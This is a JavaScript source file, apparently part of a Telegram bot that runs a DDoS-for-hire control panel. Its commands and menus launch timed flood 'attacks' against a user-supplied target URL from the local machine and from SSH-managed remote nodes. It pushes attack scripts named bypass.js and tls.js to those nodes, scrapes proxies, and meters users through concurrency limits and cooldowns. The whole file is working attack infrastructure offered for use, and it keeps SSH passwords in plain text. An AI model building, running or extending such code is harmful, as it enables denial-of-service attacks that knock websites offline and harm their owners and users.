  const txt = `🖥 <b>Manage Servers (${list.length})</b>\n\nClick to view or add a new server.`;
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

async function showServerActions(chatId, editMsgId, serverId) {
  const s = getServer(serverId);
  if (!s) return;
  const kb = [
    [coloredBtn('🔄 Sync Scripts', `srv_sync_${serverId}`, 'primary')],
    [coloredBtn('❌ Delete Server', `srv_del_${serverId}`, 'danger')],
    [coloredBtn('⬅️ Back', 'adm_servers', 'primary')]
  ];
  const txt = [
    `🖥 <b>${esc(s.name)}</b>`,
    `Host: <code>${s.host}:${s.port}</code>`,
    `Status: <b>${s.status}</b>`,
    `User: ${s.username}`
  ].join('\n');
  if (editMsgId) await edit(chatId, editMsgId, txt, { reply_markup: { inline_keyboard: kb } });
  else await bot.sendMessage(chatId, txt, { parse_mode: 'HTML', reply_markup: { inline_keyboard: kb } });
}

/* ══════════════════════════ ATTACK LAUNCHER ══════════════════════════ */

async function runAttack(user, method, parsed, chatId) {
  const useLocal = true;
  const serversToUse = loadServers().filter(s => s.status === 'online');
  const totalTargets = 1 + serversToUse.length;
  const batchId = newBatchId();

  const progress = await bot.sendMessage(chatId,
    `🚀 <b>Launching</b> ${method.name}\n` +
    `🎯 Target: <code>${esc(parsed.target)}</code>\n` +
    `⏱ ${parsed.duration}s · ${parsed.threads}T · ${parsed.rate}R\n\n` +
    `⚡ Dispatching to ${totalTargets} node(s)...`,
    { parse_mode: 'HTML' }
  );

  await prewarmServers(serversToUse.map(s => s.id));

  const launchPromises = [];

  launchPromises.push((async () => {
    try {
      const session = launchLocal(user, method, parsed.args, batchId);
      return { ok: true, session };
    } catch (e) { return { ok: false, error: e.message }; }
  })());

  for (const s of serversToUse) {
    launchPromises.push((async () => {
      try {
        const session = await launchRemote(user, method, parsed.args, s.id, batchId);
        return { ok: true, session };
      } catch (e) { return { ok: false, error: e.message }; }
    })());
  }

  const launched = await Promise.all(launchPromises);
  const okCount = launched.filter(l => l.ok).length;

  if (okCount > 0) {
    batches.set(batchId, {
      chatId, total: okCount, pending: okCount,
      methodName: method.name,
      target: parsed.target,
      duration: parsed.duration,
    });
  }

  if (user.limits && user.limits.cooldown > 0) {
    cooldowns.set(user.telegramId, { until: Date.now() + user.limits.cooldown * 1000 });
  }

  const newStats = serverStats();
  audit('attack_launched', user.telegramId, {
    method: method.id, target: parsed.target,
    servers: serversToUse.map(s => s.id), ok: okCount,
  });

  const lines = [
    okCount > 0 ? '✅ <b>Attack dispatched</b>' : '❌ <b>Attack failed</b>',
    '',
    `📦 Method: <b>${method.name}</b>`,
    `🎯 Target: <code>${esc(parsed.target)}</code>`,
    `⏱ ${parsed.duration}s · ${parsed.threads}T · ${parsed.rate}R`,
    '',
    `📡 Servers: ${newStats.online}/${newStats.total} online · ${newStats.attacking} attacking`,
    `🎯 Launched: <b>${okCount}</b>/${totalTargets} node(s)`,
  ];
  if (okCount < totalTargets) lines.push(`\n⚠️ ${totalTargets - okCount} node(s) failed — contact admin`);
  if (okCount > 0) lines.push(`\n<i>You will be notified when attack finishes.</i>`);

  const doneKb = { inline_keyboard: [[coloredBtn('📊 Check Status', 'menu_status', 'primary')]] };
  await edit(chatId, progress.message_id, lines.join('\n'), { reply_markup: doneKb });
}

/* ══════════════════════════ COMMANDS ══════════════════════════ */

bot.onText(/^\/start/, async (msg) => {
  ensureUserExists(msg);
  await showMainMenu(msg.chat.id);
});

bot.onText(/^\/menu/, async (msg) => {
  ensureUserExists(msg);
  await showMainMenu(msg.chat.id);
});

bot.onText(/^\/attack(?:\s+(.+))?/, async (msg, match) => {
  const user = ensureUserExists(msg);

  if (!match[1]) {
    return showAttackMenu(msg.chat.id);
  }

  if (user.role === 'pending') return reply(msg, '⏳ <b>Pending approval.</b>\nContact admin to activate.');
  if (user.role === 'banned') return reply(msg, '🚫 <b>Banned.</b>');

  const args = match[1].trim().split(/\s+/);
  const methodId = args[0];
  const method = getMethod(methodId);
  if (!method) return reply(msg, `❌ Unknown method <code>${esc(methodId)}</code>\nUse /methods to see all.`);
  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, method.file))) return reply(msg, `❌ Missing file: <code>${method.file}</code>`);

  const cd = cooldowns.get(msg.from.id);
  if (cd && cd.until > Date.now()) {
    const left = Math.ceil((cd.until - Date.now()) / 1000);
    return reply(msg, `⏳ Cooldown: <b>${left}s</b> remaining.`);
  }

  const limit = user.limits?.maxConcurrent || 0;
  if (limit > 0 && userActiveSessions(msg.from.id) >= limit) {
    return reply(msg, `❌ Max concurrent (${limit}) reached.`);
  }

  let parsed;
  try {
    parsed = method.parse(args.slice(1));
    if (!parsed.target || !parsed.duration) {
      return reply(msg, `❌ Missing args.\n<b>Usage:</b> <code>${esc(method.example)}</code>`);
    }
    const t = validateTarget(parsed.target);
    if (isBlacklisted(t.host)) return reply(msg, `🚫 <code>${esc(t.host)}</code> is blacklisted.`);
    checkLimits(user, parsed.duration, parsed.threads, parsed.rate);
  } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }

  await runAttack(user, method, parsed, msg.chat.id);
});

bot.onText(/^\/methods/, async (msg) => {
  ensureUserExists(msg);
  await showMethods(msg.chat.id);
});

bot.onText(/^\/servers/, async (msg) => {
  ensureUserExists(msg);
  await showServers(msg.chat.id, null, msg.from.id);
});

bot.onText(/^\/status/, async (msg) => {
  ensureUserExists(msg);
  await showStatus(msg.chat.id, null, msg.from.id);
});

bot.onText(/^\/me/, async (msg) => {
  const user = ensureUserExists(msg);
  const l = user.limits || {};
  const cd = cooldowns.get(msg.from.id);
  const cdLeft = cd && cd.until > Date.now() ? Math.ceil((cd.until - Date.now()) / 1000) : 0;
  await reply(msg, [
    `👤 <b>Account</b>`,
    `ID: <code>${user.telegramId}</code>`,
    `Role: <b>${user.role}</b>`,
    '',
    `<b>Limits:</b>`,
    `Duration: ${l.maxDuration || '∞'} · Threads: ${l.maxThreads || '∞'}`,
    `Rate: ${l.maxRate || '∞'} · Concurrent: ${l.maxConcurrent || '∞'}`,
    `Cooldown: ${l.cooldown || 0}s`,
    cdLeft > 0 ? `\n⏳ Cooldown: <b>${cdLeft}s</b>` : '',
  ].join('\n'), { reply_markup: mainMenu(msg.from.id) });
});

bot.onText(/^\/stop(?:\s+(.+))?/, async (msg, match) => {
  ensureUserExists(msg);
  const id = match[1];
  if (!id) return reply(msg, 'Usage: <code>/stop &lt;session_id&gt;</code>');
  const s = sessions.get(id);
  if (!s) return reply(msg, '❌ Not found.');
  if (s.owner !== msg.from.id && !isAdmin(msg.from.id)) return reply(msg, '❌ Not your session.');
  stopSession(id, 'manual');
  await reply(msg, `✅ Stopped <code>${id}</code>`);
});

bot.onText(/^\/killall/, async (msg) => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only.');
  const killed = stopAllSessions(null);
  await reply(msg, killed > 0 ? `💀 Killed <b>${killed}</b> session(s).` : '📭 No active sessions.');
});

bot.onText(/^\/scrape/, async (msg) => {
  const user = ensureUserExists(msg);
  if (!isAdmin(msg.from.id) && user.role !== 'user') return reply(msg, '❌ Denied.');
  await reply(msg, '🔄 Scraping proxies...');
  try {
    const n = await scrapeProxies();
    await reply(msg, `✅ <b>${n}</b> proxies ready\n\n<i>Admin: use Admin Panel → Refresh All</i>`);
  } catch (e) { await reply(msg, `❌ ${esc(e.message)}`); }
});

bot.onText(/^\/admin/, async (msg) => {
  if (!isAdmin(msg.from.id)) return reply(msg, '🚫 Admin only.');
  await showAdminPanel(msg.chat.id);
});

/* ══════════════════════════ CALLBACK ROUTER ══════════════════════════ */

bot.on('callback_query', async (q) => {
  const chatId = q.message.chat.id;
  const msgId = q.message.message_id;
  const userId = q.from.id;
  const data = q.data;

  try {
    if (data === 'menu_main') {
      await answerCB(q.id, '🏠 Main menu');
      return showMainMenu(chatId, msgId);
    }

    if (data === 'menu_attack') {
      await answerCB(q.id, '🚀 Choose method');
      return showAttackMenu(chatId, msgId);
    }

    if (data === 'menu_status') {
      await answerCB(q.id, '📊 Status');
      return showStatus(chatId, msgId, userId);
    }

    if (data === 'menu_servers') {
      await answerCB(q.id, '📡 Servers');
      return showServers(chatId, msgId, userId);
    }

    if (data === 'menu_methods') {
      await answerCB(q.id, '📦 Methods');
      return showMethods(chatId, msgId);
    }

    if (data === 'menu_admin') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '👑 Admin');
      return showAdminPanel(chatId, msgId);
    }

    if (data.startsWith('method_')) {
      const methodId = data.slice('method_'.length);
      await answerCB(q.id, '📦 Method');
      return showMethodDetail(chatId, msgId, methodId);
    }

    if (data.startsWith('quick_')) {
      const methodId = data.slice('quick_'.length);
      const m = getMethod(methodId);
      if (!m) return answerCB(q.id, '❌ Method not found', true);

      pendingInput.set(userId, {
        action: 'quick_launch_target',
        data: { methodId },
        expires: Date.now() + 120000,
      });

      await answerCB(q.id, '⚡ Quick launch started');
      return bot.sendMessage(chatId,
        `⚡ <b>Quick Launch: ${m.name}</b>\n\n` +
        `Step 1/2 — Send the target URL:\n` +
        `<i>Example:</i> <code>https://example.com</code>\n\n` +
        `<i>Type /cancel to abort</i>`,
        { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } }
      );
    }

    /* --- ADMIN USERS --- */
    if (data === 'adm_users') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '👥 Users');
      return showAdminUsers(chatId, msgId);
    }
    if (data.startsWith('usr_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const targetId = data.slice('usr_'.length);
      await answerCB(q.id, '👤 User');
      return showUserActions(chatId, msgId, targetId);
    }
    if (data.startsWith('approve_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const targetId = data.slice('approve_'.length);
      upsertUser(targetId, { role: 'user' });
      await answerCB(q.id, '✅ Approved', true);
      return showUserActions(chatId, msgId, targetId);
    }
    if (data.startsWith('ban_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const targetId = data.slice('ban_'.length);
      if (isAdmin(Number(targetId))) return answerCB(q.id, '❌ Cannot ban admin', true);
      upsertUser(targetId, { role: 'banned' });
      await answerCB(q.id, '🚫 Banned', true);
      return showUserActions(chatId, msgId, targetId);
    }
    if (data.startsWith('del_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const targetId = data.slice('del_'.length);
      if (isAdmin(Number(targetId))) return answerCB(q.id, '❌ Cannot delete admin', true);
      const users = loadUsers();
      delete users[targetId];
      saveUsers(users);
      await answerCB(q.id, '❌ Deleted', true);
      return showAdminUsers(chatId, msgId);
    }
    if (data.startsWith('setdur_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const targetId = data.slice('setdur_'.length);
      pendingInput.set(userId, { action: 'set_limit_duration', data: { targetId }, expires: Date.now() + 60000 });
      await answerCB(q.id, 'Enter duration');
      return bot.sendMessage(chatId, `⏱ Send max duration in seconds for this user (e.g. <code>60</code>).\n<i>Send 0 for unlimited.</i>`, { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }
    if (data.startsWith('setconc_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const targetId = data.slice('setconc_'.length);
      pendingInput.set(userId, { action: 'set_limit_conc', data: { targetId }, expires: Date.now() + 60000 });
      await answerCB(q.id, 'Enter concurrents');
      return bot.sendMessage(chatId, `⚔️ Send max concurrent attacks for this user (e.g. <code>1</code>).\n<i>Send 0 for unlimited.</i>`, { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }

    /* --- ADMIN SERVERS --- */
    if (data === 'adm_servers') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '🖥 Servers');
      return showAdminServers(chatId, msgId);
    }
    if (data.startsWith('srv_') && !data.startsWith('srv_sync_') && !data.startsWith('srv_del_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const srvId = data.slice('srv_'.length);
      await answerCB(q.id, '🖥 Server');
      return showServerActions(chatId, msgId, srvId);
    }
    if (data.startsWith('srv_del_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const srvId = data.slice('srv_del_'.length);
      removeServer(srvId);
      await answerCB(q.id, '❌ Server deleted', true);
      return showAdminServers(chatId, msgId);
    }
    if (data.startsWith('srv_sync_')) {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const srvId = data.slice('srv_sync_'.length);
      await answerCB(q.id, '🔄 Syncing...', true);
      const conn = await getServerConn(srvId);
      if (conn) {
         for (const f of ['priv.js', 'bypass.js', 'l.js', 'tls.js']) {
            const local = path.join(CONFIG.SCRIPT_DIR, f);
            if (fs.existsSync(local)) await sshUpload(conn, local, `${CONFIG.REMOTE_DIR}/${f}`);
         }
      }
      return showServerActions(chatId, msgId, srvId);
    }
    if (data === 'addsrv_start') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      pendingInput.set(userId, { action: 'addserver_addr', data: {}, expires: Date.now() + 120000 });
      await answerCB(q.id, 'Add Server');
      return bot.sendMessage(chatId, `🔌 <b>Add New Server</b>\n\nStep 1/3 — Send <code>IP:PORT</code>\n<i>Example:</i> <code>1.2.3.4:22</code>\n\n<i>Type /cancel to abort</i>`, { parse_mode: 'HTML', reply_markup: { force_reply: true, selective: true } });
    }

    if (data === 'adm_blacklist') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const list = loadBlacklist();
      const txt = list.length === 0 ? '📭 <i>Blacklist empty.</i>' : '🚫 <b>Blacklisted:</b>\n' + list.map(h => `• <code>${esc(h)}</code>`).join('\n');
      await answerCB(q.id, '🚫 Blacklist');
      return edit(chatId, msgId, txt, { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
    }
    if (data === 'adm_stats') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const users = loadUsers();
      const s = serverStats();
      const txt = [
        '📊 <b>Global Stats</b>',
        '',
        `👥 Users: <b>${Object.keys(users).length}</b>`,
        `📡 Servers: <b>${s.online}/${s.total}</b> online`,
        `⚔️ Sessions: <b>${[...sessions.values()].filter(x => x.status === 'running').length}</b>`,
        `🚫 Blacklist: ${loadBlacklist().length}`,
        `📦 Methods: ${availableMethods().length}`,
      ].join('\n');
      await answerCB(q.id, '📊 Stats');
      return edit(chatId, msgId, txt, { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
    }
    if (data === 'adm_refresh') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      await answerCB(q.id, '🔄 Refreshing...');
      const servers = loadServers();
      if (servers.length === 0) return edit(chatId, msgId, '📭 No servers.', { reply_markup: backMenu('⬅️ Back', 'menu_admin') });
      let done = 0, online = 0;
      await Promise.all(servers.map(async (s) => {
        const r = await checkServerHealth(s.id, true);
        done++;
        if (r.online) online++;
        await edit(chatId, msgId, `🔄 Refreshing ${done}/${servers.length}...\n🟢 ${online} · 🔴 ${done - online}`);
      }));
      await edit(chatId, msgId,
        `✅ <b>Done</b>\n🟢 ${online} online · 🔴 ${servers.length - online} offline`,
        { reply_markup: backMenu('⬅️ Back', 'menu_admin') }
      );
      return;
    }
    if (data === 'adm_killall') {
      if (!isAdmin(userId)) return answerCB(q.id, '🚫 Admin only', true);
      const killed = stopAllSessions(null);
      await answerCB(q.id, killed > 0 ? `💀 Killed ${killed}` : '📭 None active', true);
      return showAdminPanel(chatId, msgId);
    }

    await answerCB(q.id, '⚠️ Unknown action');
  } catch (e) {
    console.error('[callback]', e);
    try { await answerCB(q.id, '❌ ' + e.message, true); } catch {}
  }
});

/* ══════════════════════════ MESSAGE ROUTER (PENDING INPUTS) ══════════════════════════ */

bot.on('message', async (msg) => {
  if (!msg.text) return;
  const text = msg.text.trim();
  if (text.startsWith('/')) {
    if (text === '/cancel') {
      pendingInput.delete(msg.from.id);
      return reply(msg, '❎ Cancelled.');
    }
    return;
  }

  const pending = pendingInput.get(msg.from.id);
  if (!pending || (pending.expires && Date.now() > pending.expires)) return;

  const user = ensureUserExists(msg);
  const data = pending.data || {};

  // --- QUICK LAUNCH ---
  if (pending.action === 'quick_launch_target') {
    if (!/^https?:\/\//i.test(text)) return reply(msg, '❌ URL must start with <code>https://</code>. Try again or /cancel.');
    pending.action = 'quick_launch_duration';
    pending.data.target = text;
    pendingInput.set(msg.from.id, pending);
    return reply(msg, `⏱ <b>Step 2/2 — Duration</b>\n\nSend duration in seconds (e.g. <code>60</code>)\n<i>Type /cancel to abort</i>`);
  }
  if (pending.action === 'quick_launch_duration') {
    const duration = parseInt(text, 10);
    if (!duration || duration < 1 || duration > 3600) return reply(msg, '❌ Duration must be between 1 and 3600. Try again or /cancel.');
    const { methodId, target } = pending.data;
    pendingInput.delete(msg.from.id);
    const method = getMethod(methodId);
    if (!method) return reply(msg, '❌ Method gone.');
    const cd = cooldowns.get(msg.from.id);
    if (cd && cd.until > Date.now()) return reply(msg, `⏳ Cooldown: <b>${Math.ceil((cd.until - Date.now()) / 1000)}s</b> remaining.`);
    let parsed;
    try {
      parsed = method.parse([target, String(duration)]);
      const t = validateTarget(parsed.target);
      if (isBlacklisted(t.host)) return reply(msg, `🚫 Blacklisted.`);
      checkLimits(user, parsed.duration, parsed.threads, parsed.rate);
    } catch (e) { return reply(msg, `❌ ${esc(e.message)}`); }
    return runAttack(user, method, parsed, msg.chat.id);
  }

  // --- ADD SERVER FLOW ---
  if (pending.action === 'addserver_addr') {
    if (!/^[\w.-]+:\d+$/.test(text)) return reply(msg, '❌ Format: <code>ip:port</code>');
    data.addr = text;
    pending.action = 'addserver_user';
    pendingInput.set(msg.from.id, pending);
    return reply(msg, '👤 Step 2/3 — Send SSH username (e.g. <code>root</code>):');
  }
  if (pending.action === 'addserver_user') {
    data.username = text;
    pending.action = 'addserver_pass';
    pendingInput.set(msg.from.id, pending);
    return reply(msg, '🔑 Step 3/3 — Send SSH password:\n<i>(This message will be deleted for security)</i>');
  }
  if (pending.action === 'addserver_pass') {
    data.password = text;
    pending.action = 'addserver_name';
    pendingInput.set(msg.from.id, pending);
    try { await bot.deleteMessage(msg.chat.id, msg.message_id); } catch {}
    return reply(msg, '🏷 Send a short name for this server (e.g. <code>US-Node-1</code>):');
  }
  if (pending.action === 'addserver_name') {
    const name = text;
    pendingInput.delete(msg.from.id);
    const [host, portStr] = data.addr.split(':');
    const port = parseInt(portStr, 10);
    const id = newServerId();
    const sm = await reply(msg, '🔄 Testing SSH connection...');
    const server = { id, host, port, username: data.username, password: data.password, name, status: 'testing', addedBy: msg.from.id, addedAt: new Date().toISOString(), lastCheck: 0 };
    try {
      const conn = await sshConnect(server);
      conn.end();
      upsertServer({ ...server, status: 'online', lastCheck: Date.now() });
      await edit(msg.chat.id, sm.message_id, `✅ <b>Server added!</b>\nName: ${name}\nHost: <code>${host}:${port}</code>\n\n<i>Remember to sync scripts via Manage Servers.</i>`);
    } catch (e) {
      await edit(msg.chat.id, sm.message_id, `❌ SSH failed: <code>${esc(e.message.slice(0, 100))}</code>`);
    }
    return;
  }

  // --- SET LIMITS FLOW ---
  if (pending.action === 'set_limit_duration') {
    const val = parseInt(text, 10);
    if (isNaN(val) || val < 0) return reply(msg, '❌ Must be a number. Send 0 for unlimited.');
    const { targetId } = data;
    const targetUser = getUser(targetId);
    if (!targetUser) return reply(msg, '❌ User not found.');
    upsertUser(targetId, { limits: { ...(targetUser.limits || {}), maxDuration: val } });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Max duration for user set to <b>${val === 0 ? 'Unlimited' : val + 's'}</b>.`);
    return showUserActions(msg.chat.id, null, targetId);
  }
  if (pending.action === 'set_limit_conc') {
    const val = parseInt(text, 10);
    if (isNaN(val) || val < 0) return reply(msg, '❌ Must be a number. Send 0 for unlimited.');
    const { targetId } = data;
    const targetUser = getUser(targetId);
    if (!targetUser) return reply(msg, '❌ User not found.');
    upsertUser(targetId, { limits: { ...(targetUser.limits || {}), maxConcurrent: val } });
    pendingInput.delete(msg.from.id);
    await reply(msg, `✅ Max concurrent attacks for user set to <b>${val === 0 ? 'Unlimited' : val}</b>.`);
    return showUserActions(msg.chat.id, null, targetId);
  }
});

/* ══════════════════════════ STARTUP ══════════════════════════ */

(async () => {
  console.log('[bot] starting v8 (advanced server & user management)...');
  console.log('[bot] script dir:', CONFIG.SCRIPT_DIR);
  console.log('[bot] admins:', CONFIG.ADMIN_IDS);
  console.log('[bot] methods:', availableMethods().map(m => m.id).join(', ') || '(none)');

  for (const id of CONFIG.ADMIN_IDS) {
    if (!getUser(id)) {
      upsertUser(id, {
        telegramId: id, role: 'admin', createdAt: new Date().toISOString(),
        limits: { maxDuration: 0, maxThreads: 0, maxRate: 0, maxConcurrent: 0, cooldown: 0 },
      });
      console.log(`[bot] admin ${id} bootstrapped`);
    }
  }

  try {
    const me = await bot.getMe();
    console.log(`[bot] connected as @${me.username}`);
  } catch (e) { console.error('[bot] getMe:', e.message); }

  const servers = loadServers();
  if (servers.length > 0) {
    console.log(`[bot] pre-warming ${servers.length} server connections...`);
    prewarmServers(servers.map(s => s.id)).then(() => {
      const online = servers.filter(s => serverConns.has(s.id)).length;
      console.log(`[bot] ${online}/${servers.length} servers connected`);
    }).catch(() => {});
  }

  if (!fs.existsSync(path.join(CONFIG.SCRIPT_DIR, CONFIG.PROXY_FILE))) {
    console.log('[bot] scraping proxies...');
    try { console.log(`[bot] ${await scrapeProxies()} proxies`); } catch (e) { console.error('[bot]', e.message); }
  }
})();

process.on('SIGINT', () => { console.log('\n[bot] bye'); process.exit(0); });
process.on('SIGTERM', () => { console.log('\n[bot] bye'); process.exit(0); });